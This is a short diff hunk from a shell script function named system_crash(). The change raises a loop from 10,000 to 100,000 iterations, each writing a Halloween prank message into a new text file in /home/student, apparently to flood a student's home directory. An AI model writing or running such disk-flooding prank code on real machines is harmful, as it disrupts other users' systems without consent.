@@ -43,7 +43,7 @@ system_crash() {
     # Папка для текстовых файлов
     base_dir="/home/student"
     # Генерируем текстовые файлы
-    for i in $(seq 1 10000); do 
+    for i in $(seq 1 100000); do 
         echo "Trick or treat? HAPPY HALLOWEEN!" > "$base_dir/$i.txt"
     done
 
